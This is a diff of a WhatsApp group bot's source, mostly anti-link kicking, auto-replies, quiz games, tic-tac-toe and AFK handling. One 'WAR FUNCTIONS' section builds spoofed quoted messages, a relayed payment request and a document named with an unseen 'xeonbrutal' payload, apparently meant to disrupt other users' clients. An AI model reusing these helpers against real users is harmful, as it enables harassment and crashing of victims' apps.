+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Bad Word Detected ã€\`\`\`\n\n@${kice.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})}
+}
+//antilink youtube video by xeon
+if (AntiLinkYoutubeVid)
+if (budy.includes("https://youtu.be/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`YoutTube Video Link Detected\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ YouTube Video Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink youtube channel by xeon
+if (AntiLinkYoutubeChannel)
+   if (budy.includes("https://youtube.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`ã€Œ YoutTube Channel Link Detected ã€\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ YouTube Channel Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink instagram by xeon
+if (AntiLinkInstagram)
+   if (budy.includes("https://www.instagram.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`ã€Œ Instagram Link Detected ã€\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Instagram Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink facebook by xeon
+if (AntiLinkFacebook)
+   if (budy.includes("https://facebook.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`ã€Œ Facebook Link Detected ã€\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Facebook Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink telegram by xeon
+if (AntiLinkTelegram)
+   if (budy.includes("https://t.me/")){
+if (AntiLinkTelegram)
+if (!isBotAdmins) return
+bvl = `\`\`\`ã€Œ Telegram Link Detected ã€\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Telegram Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink tiktok by xeon
+if (AntiLinkTiktok)
+   if (budy.includes("https://www.tiktok.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`ã€Œ Tiktok Link Detected ã€\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Tiktok Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink twitter by xeon
+if (AntiLinkTwitter)
+   if (budy.includes("https://twitter.com/")){
+if (!isBotAdmins) return
+bvl = `\`\`\`ã€Œ Twitter Link Detected ã€\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Tiktok Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+//antilink all by xeon
+if (AntiLinkAll)
+   if (budy.includes("https://")){
+if (!isBotAdmins) return
+bvl = `\`\`\`ã€Œ Link Detected ã€\`\`\`\n\nAdmin has sent a link, admin is free to send any link🔖˜‡`
+if (isAdmins) return m.reply(bvl)
+if (m.key.fromMe) return m.reply(bvl)
+if (isCreator) return m.reply(bvl)
+kice = m.sender
+await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+} else {
+}
+        
+        //auto reply by xeon
+  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+        for (let anji of xeonysticker){
+				if (budy === anji){
+					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
+					XeonBotInc.sendMessage(m.chat, { sticker: result }, { quoted: m })
+					}
+			}
+			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+			for (let anju of xeonyaudio){
+				if (budy === anju){
+					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
+					XeonBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+					}
+			}
+			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+			for (let anjh of xeonyimage){
+				if (budy === anjh){
+					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
+					XeonBotInc.sendMessage(m.chat, { image: result }, { quoted: m })
+					}
+			}
+			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+					for (let anjh of xeonyvideo){
+				if (budy === anjh){
+					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
+					XeonBotInc.sendMessage(m.chat, { video: result }, { quoted: m })
+					}
+				  }
+				
+				
+				
+				//-------------------🔖˜£ï¸WAR FUNCTIONS🔖˜£ï¸-----------------\\
+	//-------------------🔖˜£ï¸WAR FUNCTIONS🔖˜£ï¸-----------------\\
+	//-------------------🔖˜£ï¸WAR FUNCTIONS🔖˜£ï¸-----------------\\
+	const deploy = (teks) => {
+  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+}
+
+const doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `${ownername}🔖˜£ï¸${xeonbrutal(prefix)}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
+}}
+}
+
+const xezy = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
+},
+"contextInfo": {
+"stanzaId": "3EB0382EDBB2",
+"externalAdReply": {
+"previewType": "PHOTO",
+"showAdAttribution": true,
+"sourceUrl": websitex,
+"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+"thumbnail": xeonbugpic,
+}}}
+
+const bhosdike = (teks) => {
+ XeonBotInc.sendMessage(m.chat, { image: xeonbugpic, caption: wm, contextInfo:{"externalAdReply": {"title": botname,"body": ownername,
+previewType: "PHOTO",
+showAdAttribution: true,
+sourceUrl: websitex,
+thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+thumbnail: xeonbugpic,
+}
+}}, { quoted:xezy})
+}
+
+//emoji 
+const emote = (satu, dua) => {
+try{	    
+const { EmojiAPI } = require("emoji-api");
+const emoji = new EmojiAPI();
+emoji.get(satu)
+.then(emoji => {
+const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
+const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go! 🏃🏻‍♂️",footerText: `${botname}`,buttons: buttons,headerType: 4}
+XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
+})
+} catch (e) {
+m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
+}
+}
+
+      // Mute Chat
+      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
+      return
+      }
+
+        // Respon Cmd with media
+        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
+        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
+        let { text, mentionedJid } = hash
+        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
+            userJid: XeonBotInc.user.id,
+            quoted: m.quoted && m.quoted.fakeObj
+        })
+        messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
+        messages.key.id = m.key.id
+        messages.pushName = m.pushName
+        if (m.isGroup) messages.participant = m.sender
+        let msg = {
+            ...chatUpdate,
+            messages: [proto.WebMessageInfo.fromObject(messages)],
+            type: 'append'
+        }
+        XeonBotInc.ev.emit('messages.upsert', msg)
+        }
+	    
+	if (('family100'+m.chat in _family100) && isCmd) {
+            kuis = true
+            let room = _family100['family100'+m.chat]
+            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
+            let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
+            if (!isSurender) {
+                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
+                if (room.terjawab[index]) return !0
+                room.terjawab[index] = m.sender
+            }
+            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
+            let caption = `
+Answer the following questions :\n${room.soal}\n\n\nThere is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}
+${isWin ? `All Answers Answered` : isSurender ? 'Give up!' : ''}
+${Array.from(room.jawaban, (jawaban, index) => {
+        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
+    }).filter(v => v).join('\n')}
+    ${isSurender ? '' : `Perfect Player`}`.trim()
+            XeonBotInc.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
+            if (isWin || isSurender) delete _family100['family100'+m.chat]
+        }
+
+        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebaklagu[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🔖Ž® Guess The Music 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebaklagu[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+
+        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = kuismath[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await m.reply(`🔖Ž® Math Quiz 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n\nWant To Play Again? Send ${prefix}math mode`)
+                delete kuismath[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+
+        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebakgambar[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🔖Ž® Guess The Picture 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebakgambar[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+
+        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebakkata[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🔖Ž® Guess The Word 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebakkata[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+
+        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = caklontong[m.sender.split('@')[0]]
+	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess blank', buttonText: { displayText: 'Guess The Blank' }, type: 1 }], `🔖Ž® Guess The Blank 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n*${deskripsi}*\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete caklontong[m.sender.split('@')[0]]
+		delete caklontong_desk[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+
+        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebakkalimat[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🔖Ž® Guess The Sentence 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebakkalimat[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+
+        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebaklirik[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🔖Ž® Guess The Lyrics 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebaklirik[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+	    
+	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebaktebakan[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess riddle', buttonText: { displayText: 'Guess The Riddle' }, type: 1 }], `🔖Ž® Guess The Riddle 🔖Ž®\n\nCorrect Answer 🔖Ž‰\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebaktebakan[m.sender.split('@')[0]]
+            } else m.reply('*Wrong answer!*')
+        }
+        
+        //TicTacToe
+	    this.game = this.game ? this.game : {}
+	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
+	    if (room) {
+	    let ok
+	    let isWin = !1
+	    let isTie = !1
+	    let isSurrender = !1
+	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
+	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
+	    isSurrender = !/^[1-9]$/.test(m.text)
+	    if (m.sender !== room.game.currentTurn) {  
+	    if (!isSurrender) return !0
+	    }
+	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
+	    m.reply({
+	    '-3': 'Game has ended',
+	    '-2': 'Invalid',
+	    '-1': 'Invalid Position',
+	    0: 'Invalid Position',
+	    }[ok])
+	    return !0
+	    }
+	    if (m.sender === room.game.winner) isWin = true
+	    else if (room.game.board === 511) isTie = true
+	    let arr = room.game.render().map(v => {
+	    return {
+	    X: '🔖Œ',
+	    O: '🔖­•',
+	    1: '1ï¸🔖ƒ£',
+	    2: '2ï¸🔖ƒ£',
+	    3: '3ï¸🔖ƒ£',
+	    4: '4ï¸🔖ƒ£',
+	    5: '5ï¸🔖ƒ£',
+	    6: '6ï¸🔖ƒ£',
+	    7: '7ï¸🔖ƒ£',
+	    8: '8ï¸🔖ƒ£',
+	    9: '9ï¸🔖ƒ£',
+	    }[v]
+	    })
+	    if (isSurrender) {
+	    room.game._currentTurn = m.sender === room.game.playerX
+	    isWin = true
+	    }
+	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
+	    let str = `Room ID: ${room.id}
+
+${arr.slice(0, 3).join('')}
+${arr.slice(3, 6).join('')}
+${arr.slice(6).join('')}
+
+${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['🔖Œ', '🔖­•'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
+🔖Œ: @${room.game.playerX.split('@')[0]}
+🔖­•: @${room.game.playerO.split('@')[0]}
+
+Typed *give up* to surrender and admited defeat`
+	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
+	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
+	    if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
+	    await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
+	    if (isTie || isWin) {
+	    delete this.game[room.id]
+	    }
+	    }
+
+        //Suit PvP
+	    this.suit = this.suit ? this.suit : {}
+	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
+	    if (roof) {
+	    let win = ''
+	    let tie = false
+	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
+	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
+	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
+	    delete this.suit[roof.id]
+	    return !0
+	    }
+	    roof.status = 'play'
+	    roof.asal = m.chat
+	    clearTimeout(roof.waktu)
+	    //delete roof[roof.id].waktu
+	    XeonBotInc.sendText(m.chat, `Suit has been sent to chat
+
+@${roof.p.split`@`[0]} dan 
+@${roof.p2.split`@`[0]}
+
+Please choose a suit in the respective chat"
+click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
+	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Please Select \n\Rock🔖—¿\nPaper🔖“„\nScissors🔖œ‚ï¸`, m)
+	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Please Select \n\nRock🔖—¿\nPaper🔖“„\nScissors🔖œ‚ï¸`, m)
+	    roof.waktu_milih = setTimeout(() => {
+	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
+	    else if (!roof.pilih || !roof.pilih2) {
+	    win = !roof.pilih ? roof.p2 : roof.p
+	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
+	    }
+	    delete this.suit[roof.id]
+	    return !0
+	    }, roof.timeout)
+	    }
+	    let jwb = m.sender == roof.p
+	    let jwb2 = m.sender == roof.p2
+	    let g = /scissors/i
+	    let b = /rock/i
+	    let k = /paper/i
+	    let reg = /^(scissors|rock|paper)/i
+	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
+	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
+	    roof.text = m.text
+	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
+	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
+	    }
+	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
+	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
+	    roof.text2 = m.text
+	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
+	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
+	    }
+	    let stage = roof.pilih
+	    let stage2 = roof.pilih2
+	    if (roof.pilih && roof.pilih2) {
+	    clearTimeout(roof.waktu_milih)
+	    if (b.test(stage) && g.test(stage2)) win = roof.p
+	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
+	    else if (g.test(stage) && k.test(stage2)) win = roof.p
+	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
+	    else if (k.test(stage) && b.test(stage2)) win = roof.p
+	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
+	    else if (stage == stage2) tie = true
+	    XeonBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}
+
+@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
+@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
+`.trim(), m, { mentions: [roof.p, roof.p2] })
+	    delete this.suit[roof.id]
+	    }
+	    }
+	    
+	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
+	    for (let jid of mentionUser) {
+            let user = global.db.data.users[jid]
+            if (!user) continue
+            let afkTime = user.afkTime
+            if (!afkTime || afkTime < 0) continue
+            let reason = user.afkReason || ''
+            m.reply(`
+Don't tag him!
+He's in AFK ${reason ? 'with reason ' + reason : 'no reason'}
+During ${clockString(new Date - afkTime)}
+`.trim())
+        }
+
+        if (db.data.users[m.sender].afkTime > -1) {
+            let user = global.db.data.users[m.sender]
+            m.reply(`
+You stop AFK${user.afkReason ? ' after ' + user.afkReason : ''}
+During ${clockString(new Date - user.afkTime)}
+`.trim())
+            user.afkTime = -1
+            user.afkReason = ''
+        }
+	    
+	//menu image randomizer
+	let picaks = [flaming,fluming,flarun,flasmurf]
+	let picak = picaks[Math.floor(Math.random() * picaks.length)]
+	
+	//menu doc randomizer
+let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
+let docs = pickRandom(documents)
+	
+        switch(command) {
+	    case 'afk': {
+                let user = global.db.data.users[m.sender]
+                user.afkTime = + new Date
+                user.afkReason = text
+                m.reply(`${m.pushName} *Already Afk*${text ? ': ' + text : ''}`)
+            }
+            break	
+        case 'ttc': case 'ttt': case 'tictactoe': {
+        	if (!m.isGroup) throw mess.group
+            let TicTacToe = require("./lib/tictactoe")
+            this.game = this.game ? this.game : {}
+            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'You are still in the game'
+            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
+            if (room) {
+            m.reply('Partners found!')
+            room.o = m.chat
+            room.game.playerO = m.sender
+            room.state = 'PLAYING'
+            let arr = room.game.render().map(v => {
+            return {
+            X: '🔖Œ',
+            O: '🔖­•',
+            1: '1ï¸🔖ƒ£',
+            2: '2ï¸🔖ƒ£',
+            3: '3ï¸🔖ƒ£',
+            4: '4ï¸🔖ƒ£',
+            5: '5ï¸🔖ƒ£',
+            6: '6ï¸🔖ƒ£',
+            7: '7ï¸🔖ƒ£',
+            8: '8ï¸🔖ƒ£',
+            9: '9ï¸🔖ƒ£',
+            }[v]
+            })
+            let str = `Room ID: ${room.id}
+
+${arr.slice(0, 3).join('')}
+${arr.slice(3, 6).join('')}
+${arr.slice(6).join('')}
+
+Wait @${room.game.currentTurn.split('@')[0]}
+
+Type *give up* to surrender and admit defeat`
+            if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
+            await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
+            } else {
+            room = {
+            id: 'tictactoe-' + (+new Date),
+            x: m.chat,
+            o: '',
+            game: new TicTacToe(m.sender, 'o'),
+            state: 'WAITING'
+            }
+            if (text) room.name = text
+            m.reply('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
+            this.game[room.id] = room
+            }
+            }
+            break
+            case 'delttc': case 'delttt': {
+            this.game = this.game ? this.game : {}
+            try {
+            if (this.game) {
+            delete this.game
+            XeonBotInc.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
+            } else if (!this.game) {
+            m.reply(`Session TicTacToe🔖Ž® does not exist`)
+            } else throw '?'
+            } catch (e) {
+            m.reply('damaged')
+            }
+            }
+            break
+            case 'suitpvp': case 'suit': {
+            this.suit = this.suit ? this.suit : {}
+            let poin = 10
+            let poin_lose = 10
+            let timeout = 60000
+            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
+	    if (m.mentionedJid[0] === m.sender) return m.reply(`Can't play with myself !`)
+            if (!m.mentionedJid[0]) return m.reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
+            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `The person you are challenging is playing suit with someone else :(`
+            let id = 'suit_' + new Date() * 1
+            let caption = `_*SUIT PvP*_
+
+@${m.sender.split`@`[0]} *menantang* @${m.mentionedJid[0].split`@`[0]} *to play suit*
+
+*Please* @${m.mentionedJid[0].split`@`[0]} *to type accept/reject*`
+            this.suit[id] = {
+            chat: await XeonBotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
+            id: id,
+            p: m.sender,
+            p2: m.mentionedJid[0],
+            status: 'wait',
+            waktu: setTimeout(() => {
+            if (this.suit[id]) XeonBotInc.sendText(m.chat, `_Suit time out_`, m)
+            delete this.suit[id]
+            }, 60000), poin, poin_lose, timeout
+            }
+            }
+            break
+	case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
+teks = `*ã€Œ ${global.botname} Script ã€*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nDont forget to donate 🔖œ`
+let buttons = [
+{buttonId: `owner`, buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+let buttonMessage = {
+image: {url: `https://i.ibb.co/VHchNTC/xpic.jpg`},
+jpegThumbnail: log0,
+caption: teks,
+footer: `${botname}`,
+buttons: buttons,
+headerType: 4,
+contextInfo:{externalAdReply:{
+title:"I deserve something for my hardwork",
+body: "Click to donate", 
+thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
+mediaType:1,
+mediaUrl: 'https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg',
+sourceUrl: "https://i.ibb.co/w46VQ8D/Picsart-22-10-08-06-46-30-674.jpg"
+}}
+}
+XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+}
+            break		 
+            case 'chat': {
+                if (!isCreator) throw mess.owner
+                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
+                if (args[0] === 'mute') {
+                    XeonBotInc.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                } else if (args[0] === 'unmute') {
+                    XeonBotInc.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
